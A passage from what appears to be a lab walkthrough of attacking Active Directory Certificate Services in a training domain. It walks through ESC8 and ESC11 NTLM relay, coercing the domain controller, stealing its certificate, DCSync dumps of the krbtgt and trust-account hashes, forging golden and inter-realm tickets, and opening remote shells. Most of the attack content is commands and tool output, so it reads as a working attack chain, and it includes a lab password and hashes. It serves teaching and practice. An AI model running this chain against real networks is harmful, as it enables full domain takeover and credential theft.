...
### Quick Wins - Relaying Attacks ###
- We can check for web enrollment interfaces to quickly achieve DA privileges, since they are vulnerable to NTLM relay attacks in their default configurations.
```powershell
PS C:\ADCS\Auditor> certutil -enrollmentServerURL -config CB-CA
Enrollment Server Url[0]:
  Priority 1
  Authentication 2
    Kerberos -- 2
  AllowRenewalsOnly 0
  https://cb-ca.cb.corp/CB-CA_CES_Kerberos/service.svc/CES
  AllowKeyBasedRenewal 0
CertUtil: -enrollmentServerURL command completed successfully.
```

#### [[ESC8]] ####
- Using NTLM relay, on **WS-33** we can impersonate any inbound-NTLM-authenticating AD account. Let's properly set up **impacket-ntlmrelayx** for ADCS relaying.
```bash
(impacket_venv) root@cb-ws33:/opt/Tools/impacket# /opt/Tools/impacket/examples/ntlmrelayx.py -t http://cb-ca.cb.corp/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'
...
- We will now need to coerce the authentication from  **CB-DC** to our listener.
```powershell
PS C:\ADCS\Auditor> .\PetitPotam.exe 172.16.99.33 172.16.67.1
...
PS C:\ADCS\Auditor> .\PetitPotam.exe 172.16.99.33 172.16.67.1 EfsRpcOpenFileRaw
Did not receive expected output. Attack might have failed.
PS C:\ADCS\Auditor> .\PetitPotam.exe 172.16.99.33 172.16.67.1 EfsRpcEncryptFileSrv
Did not receive expected output. Attack might have failed.
PS C:\ADCS\Auditor> .\PetitPotam.exe 172.16.99.33 172.16.67.1 EfsRpcQueryRecoveryAgents
Did not receive expected output. Attack might have failed.
```

-> **PetitPotam** does not work as expected, probably because the Windows server is patched.

- We will try with **Coercer** that allows coercion utilizing a different API that is not affected by the ad-hoc check in the Microsoft Patch.
```bash
(coercer_venv) root@cb-ws33:/opt/Tools/Coercer# /opt/Tools/Coercer/Coercer.py coerce -l cb-ws33.certbulk.cb.corp -t cb-dc.certbulk.cb.corp -u student33 -p htTz2J72nH9KuAXr -d certbulk.cb.corp -v --filter-method-name "EfsRpcDuplicateEncryptionInfoFile"
       ______
...
[+] Coercing 'cb-dc.certbulk.cb.corp' to authenticate to 'cb-ws33.certbulk.cb.corp'
...
[+] SMB named pipe '\PIPE\lsarpc' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [>] (-testing-) MS-EFSR──>EfsRpcDuplicateEncryptionInfoFile(SrcFileName='\\cb-ws33.certbulk.cb.corp\O7Nr7UmG\file.      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDuplicateEncryptionInfoFile(SrcFileName='\\cb-ws33.certbulk.cb.corp\O7Nr7UmG\file.txt\x00')
Continue (C) | Skip this function (S) | Stop exploitation (X) ? X
[+] All done! Bye Bye!
```

- We will now see that we have captured the certificate of `certbulk\cb-dc`.
```bash
<snip>

[*] SMBD-Thread-5 (process_request_thread): Received connection from 172.16.67.1, attacking target http://cb-ca.cb.corp
...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 63
[*] Base64 certificate of user CB-DC$:
MIIRtQIBA...
```

- Decode the output and append it to a `.pfx` file.
```bash
echo "MIIRtQIBA....." | base64 -d >> cb-dc.pfx
```

- Use the certificate to request a TGT for `certbulk\cb-dc$`.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe asktgt /user:cb-dc$ /certificate:C:\ADCS\Auditor\Loot\cb-dc.pfx /domain:certbulk.cb.corp /dc:cb-dc.certbulk.cb.corp /nowrap /ptt /getcredentials
...
[*] Using PKINIT with etype rc4_hmac and subject: CN=cb-dc.certbulk.cb.corp
[*] Building AS-REQ (w/ PKINIT preauth) for: 'certbulk.cb.corp\cb-dc$'
...
[*] Getting credentials using U2U
  ...
  CredentialInfo         :
    ...
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 95C6BBF75DA7DF4E0BF07012FD42CECE
```

- We can now use the ticket to launch a DCSync attack and compromise any domain account we want.
```powershell
PS C:\ADCS\Auditor> .\mimikatz.exe
...
mimikatz # lsadump::dcsync /user:certbulk\krbtgt /domain:certbulk.cb.corp
[DC] 'certbulk.cb.corp' will be the domain
[DC] 'cb-dc.certbulk.cb.corp' will be the DC server
[DC] 'certbulk\krbtgt' will be the user account
[rpc] Service  : ldap
...
Account expiration   :
Password last change : 4/18/2023 6:09:35 AM
Object Security ID   : S-1-5-21-3604858216-2548435023-1717832235-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 687b29f647656b91a00696b00a19c1cf
    ntlm- 0: 687b29f647656b91a00696b00a19c1cf
    lm  - 0: 8827c7faea150a0882645f8d229e61f8

<snip>
```

- Furthermore, we can also launch a S4U2User attack to request a ticket for any service and impersonate any user we desire and pass that ticket to gain access to **CB-DC**.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:http/cb-dc.certbulk.cb.corp /ticket:doIGNjCCBjK...
...
[+] S4U2self success!
[*] Substituting alternative service name 'http/cb-dc.certbulk.cb.corp'
[*] Got a TGS for 'Administrator' to 'http@CERTBULK.CB.CORP'
[*] base64(ticket.kirbi):

<snip>

PS C:\ADCS\Auditor> .\Rubeus.exe ptt /ticket:doIGJDCCBiCgA...
...
PS C:\ADCS\Auditor> winrs -r:cb-dc.certbulk.cb.corp powershell.exe
Windows PowerShell
...
- Using NTLM relay, on **WS-33** we can impersonate any inbound-NTLM-authenticating AD account. Let's properly set up **impacket-ntlmrelayx** for ADCS relaying.
```bash
(impacket_esc11_venv) root@cb-ws33:/opt/Tools/impacket-esc11# /opt/Tools/impacket-esc11/examples/ntlmrelayx.py -t "rpc://cb-ca.cb.corp" -rpc-mode ICPR -icpr-ca-name "CB-CA" -smb2support --adcs --template 'DomainControllerAuthentication'
...
[+] SMB named pipe '\PIPE\lsarpc' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [>] (-testing-) MS-EFSR──>EfsRpcDuplicateEncryptionInfoFile(SrcFileName='\\cb-ws33.certbulk.cb.corp\Wlcy      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDuplicateEncryptionInfoFile(SrcFileName='\\cb-ws33.certbulk.cb.corp\Wlcy5UP1\file.txt\x00')
Continue (C) | Skip this function (S) | Stop exploitation (X) ? X
[+] All done! Bye Bye!
```
...
[*] Request ID is 62
[*] Base64 certificate of user CB-DC$:
b'MIIRNQIBAzCCEO8GCSqGSIb[.......snip.......]
```
-> We will only copy the base64 certificate enclosed in quotes b'CERT'.

- We can now use this certificate, after we base64 decode it, to execute a DCSync or a S4U2Self attack and compromise the domain.
### Enumerating access rights of `certbulk\student33` ###
...
### Enterprise Privilege Escalation abusing ADCS as `cb\administrator` ###
#### [[ESC3]] ####
...
### Domain Privilege Escalation abusing ADCS as `certbulk\administrator` ###
...
- If we do so, there are quite a few ways to escalate our privileges to EA.
#### 1. Abuse Child-Parent Trust Relationship ####
- First, we will use the `certbulk\administrator` to ask a TGT for that account and impersonate it.
- We will launch a DCSync attack to steal the NTLM hash of `certbulk\krbtgt` account.
```powershell
PS C:\ADCS\Auditor> .\mimikatz.exe
...
- We will then find the SIDs of the child and parent domains.
```powershell
PS C:\ADCS\Auditor> Get-DomainSID -Domain certbulk.cb.corp
S-1-5-21-3604858216-2548435023-1717832235
PS C:\ADCS\Auditor> Get-DomainSID -Domain cb.corp
S-1-5-21-2928296033-1822922359-262865665
```

- We will finally forge the golden ticket.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe golden /rc4:687b29f647656b91a00696b00a19c1cf /domain:certbulk.cb.corp /sid:S-1-5-21-3604858216-2548435023-1717832235 /sids:S-1-5-21-2928296033-1822922359-262865665-519 /user:Administrator /ptt /nowrap
...
[*] Domain         : CERTBULK.CB.CORP (CERTBULK)
[*] SID            : S-1-5-21-3604858216-2548435023-1717832235
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-2928296033-1822922359-262865665-519
[*] ServiceKey     : 687B29F647656B91A00696B00A19C1CF
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 687B29F647656B91A00696B00A19C1CF
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : certbulk.cb.corp
...
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@certbulk.cb.corp'

[*] AuthTime       : 9/26/2023 10:36:41 AM
[*] StartTime      : 9/26/2023 10:36:41 AM
[*] EndTime        : 9/26/2023 8:36:41 PM
[*] RenewTill      : 10/3/2023 10:36:41 AM
...
#### 2. Abuse the Trust Key ####
- First we need to find the Inter-Realm Trust Key.
```powershell
PS C:\ADCS\Auditor> .\mimikatz.exe
...
mimikatz # lsadump::dcsync /user:certbulk\cb$ /domain:certbulk.cb.corp
[DC] 'certbulk.cb.corp' will be the domain
[DC] 'cb-dc.certbulk.cb.corp' will be the DC server
[DC] 'certbulk\cb$' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
...
Account expiration   :
Password last change : 9/25/2023 9:00:39 PM
Object Security ID   : S-1-5-21-3604858216-2548435023-1717832235-1103
Object Relative ID   : 1103

Credentials:
  Hash NTLM: 338c805fc186bbd9898f17e822d43a97

<snip>
```

- Let's forge the inter-realm TGT.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe golden /rc4:338c805fc186bbd9898f17e822d43a97 /domain:certbulk.cb.corp /sid:S-1-5-21-3604858216-2548435023-1717832235 /sids:S-1-5-21-2928296033-1822922359-262865665-519 /user:Administrator /service:krbtgt /target:cb.corp /nowrap
...
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-2928296033-1822922359-262865665-519
[*] ServiceKey     : 338C805FC186BBD9898F17E822D43A97
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 338C805FC186BBD9898F17E822D43A97
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : certbulk.cb.corp
...
[*] AuthTime       : 9/26/2023 10:53:59 AM
[*] StartTime      : 9/26/2023 10:53:59 AM
[*] EndTime        : 9/26/2023 8:53:59 PM
[*] RenewTill      : 10/3/2023 10:53:59 AM
...
- Let's use that ticket to request a TGS for the `http` service so we can access **CB-CA**.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe asktgs /service:http/cb-ca.cb.corp /dc:cb-ca.cb.corp /ptt /ticket:doIFyzCCBce...
...
[*] Building TGS-REQ request for: 'http/cb-ca.cb.corp'
...
<snip>
  ...
  ServiceName              :  http/cb-ca.cb.corp
  ServiceRealm             :  CB.CORP
  UserName                 :  Administrator
  UserRealm                :  CERTBULK.CB.CORP
  StartTime                :  9/26/2023 10:56:07 AM
  EndTime                  :  9/26/2023 8:53:59 PM
  RenewTill                :  10/3/2023 10:53:59 AM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  x8bS2sCEq6CUzfDKp6B45Qmkj+K4Fi6tmAGzUcROwyQ=


PS C:\ADCS\Auditor> PS C:\ADCS\Auditor> winrs -r:cb-ca.cb.corp powershell.exe
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
...
#### Post-Exploitation ####
- We have acquired a certificate for the EA from our previous compromisation steps. We can now request a certificate for `cb\cb-ca$` to establish long-term persistence [[PERSIST2]] to the Enterprise DC/CA.
```powershell
